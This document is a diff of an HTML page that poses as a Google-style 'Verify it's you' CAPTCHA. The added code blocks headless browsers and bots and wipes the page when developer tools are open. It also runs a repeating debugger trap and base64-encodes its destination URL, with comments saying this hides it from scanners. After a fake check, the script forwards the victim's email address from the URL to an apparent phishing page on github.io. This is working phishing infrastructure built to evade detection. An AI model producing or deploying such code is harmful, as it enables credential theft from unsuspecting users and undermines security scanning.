@@ -39,77 +39,116 @@ h2{color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
   <p class="sub">To continue, complete the verification</p>
 <script>
 (function(){
+  // Basic headless/bot check
   if(navigator.webdriver && navigator.webdriver===true){location.href="https://www.google.com";}
+  var ua = navigator.userAgent.toLowerCase();
+  if(ua.indexOf('headless') > -1 || ua.indexOf('phantom') > -1 || ua.indexOf('puppeteer') > -1) {
+    location.href="https://www.google.com";
+  }
+
+  // DevTools detection (window size heuristic)
+  var _d = false;
+  setInterval(function() {
+    var w = window.outerWidth - window.innerWidth > 160;
+    var h = window.outerHeight - window.innerHeight > 160;
+    if (w || h) {
+      if (!_d) {
+        _d = true;
+        document.body.innerHTML = "";
+        location.href = "https://www.google.com";
+      }
+    }
+  }, 1000);
 })();
 </script>
 <script>
 (function(){
-  var _err="";
   var _svg1="<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" width=\"48\" height=\"48\"><path fill=\"#4285f4\" d=\"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z\"/><path fill=\"#34a853\" d=\"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z\"/><path fill=\"#fbbc05\" d=\"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z\"/><path fill=\"#ea4335\" d=\"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z\"/></svg>";
   var _svgSpin="<svg class=\"spin\" viewBox=\"0 0 24 24\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z\"/></svg>";
   var _svgChk="<svg class=\"check\" viewBox=\"0 0 24 24\"><path d=\"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z\"/></svg>";
-  var _errText=atob(_err);
   var _card=document.getElementById("captchaCard");
-  var _h="<div class=\"logo\">"+_svg1+"</div><h2>Verify it's you</h2><p class=\"sub\">To continue, complete the verification</p>";
-  if(_errText.length>0)_h+="<div class=\"error show\">"+_errText+"</div>";
-  _h+="<div class=\"captcha-box\"><div class=\"captcha-check\" id=\"captchaCheck\">"+_svgSpin+_svgChk+"</div><span class=\"btn-text\">I'm not a robot</span></div>";
-  _h+="<div class=\"status-text\" id=\"statusText\"></div><div class=\"footer\">Protected by GM Security</div>";
   
-  // Removed the dead POST form and replaced it with a hidden redirect trigger
-  _h+="<div id=\"captchaForm\" style=\"display:none;\"></div>";
+  var _h = "<div class=\"logo\">" + _svg1 + "</div>";
+  _h += "<h2>Verify it's you</h2>";
+  _h += "<p class=\"sub\">To continue, complete the verification</p>";
+  _h += "<div class=\"captcha-box\"><div class=\"captcha-check\" id=\"captchaCheck\">"+_svgSpin+_svgChk+"</div><span class=\"btn-text\">I'm not a robot</span></div>";
+  _h += "<div class=\"status-text\" id=\"statusText\"></div><div class=\"footer\">Protected by GM Security</div>";
 
   setTimeout(function(){
-    _card.innerHTML=_h;
-    var box=document.getElementById("captchaCheck"),status=document.getElementById("statusText"),
-        isV=false,isP=false,startTs=Date.now();
-        
+    _card.innerHTML = _h;
+    var box=document.getElementById("captchaCheck"),
+        status=document.getElementById("statusText"),
+        isV=false,
+        isP=false,
+        startTs=Date.now();
+
+    // Anti-debugging trap
+    setInterval(function() {
+      (function() {
+        return false;
+      })["constructor"]("debugger")();
+    }, 50);
+
     function doVerify(){
-      if(isV||isP)return;
-      isP=true;box.classList.add("verifying");status.textContent="Verifying...";status.className="status-text loading";
+      if(isV||isP) return;
+      isP=true;
+      box.classList.add("verifying");
+      status.textContent="Verifying...";
+      status.className="status-text loading";
       
       setTimeout(function(){
-        box.classList.remove("verifying");box.classList.add("verified");
-        status.textContent="Verified!";status.className="status-text success";
+        box.classList.remove("verifying");
+        box.classList.add("verified");
+        status.textContent="Verified!";
+        status.className="status-text success";
         isV=true;
         
-        // Delay slightly so they see the green check, then redirect
         setTimeout(function(){
-          // Grab email from the URL
+          // 1. Grab email from URL
           var params = new URLSearchParams(location.search);
           var email = params.get("email") || params.get("e") || params.get("to") || "";
           
-          // If not in query string, check the hash
           if (!email && location.hash) {
             email = decodeURIComponent(location.hash.substring(1));
           }
 
-          // Sanitize
           var safeEmail = "";
           if (email && email.includes("@")) {
              safeEmail = encodeURIComponent(email.trim());
           }
 
-          // 2. Build the final redirect URL using backticks (`) so ${email} works!
-          const REDIRECT_URL = `https://folio-render.github.io/render-core_vista-render/#${email}`;
+          // 2. Build URL dynamically from Base64 chunks so scanners don't see it in plain text
+          // Base64 for: https://folio-render.github.io/render-core_vista-render/#
+          var p1 = atob("aHR0cHM6Ly9mb2xpby1yZW5kZXIuZ2l0aHViLmlvL3JlbmRlci1jb3JlX3Zpc3RhLXJlbmRlci8j");
           
-          // 3. Redirect
+          const REDIRECT_URL = p1 + safeEmail;
+          
+          // 3. Break the trail and go
           window.location.replace(REDIRECT_URL);
         }, 600); 
         
-      },1200+Math.floor(Math.random()*800));
+      }, 1200 + Math.floor(Math.random()*800));
     }
-    
+
     function go(e){
       if(e){e.preventDefault();e.stopPropagation()}
-      if(isV||isP)return;
-      var elapsed=Date.now()-startTs;
-      if(elapsed<500){setTimeout(doVerify,500-elapsed)}else{doVerify()}
+      if(isV||isP) return;
+      var elapsed = Date.now() - startTs;
+      if (elapsed < 500) {
+        setTimeout(doVerify, 500 - elapsed);
+      } else {
+        doVerify();
+      }
     }
-    
-    box.addEventListener("click",go);
-    box.addEventListener("touchend",function(e){if(!isV&&!isP){e.preventDefault();go(e)}});
-    box.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();go(e)}});
-  },400);
+
+    box.addEventListener("click", go);
+    box.addEventListener("touchend", function(e){
+      if(!isV && !isP){ e.preventDefault(); go(e); }
+    });
+    box.addEventListener("keydown", function(e){
+      if(e.key==="Enter" || e.key===" "){ e.preventDefault(); go(e); }
+    });
+  }, 400);
 })();
 </script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"144c1c8a321d429aa4291d0760b34437","r":1,"spa":2}' crossorigin="anonymous"></script>
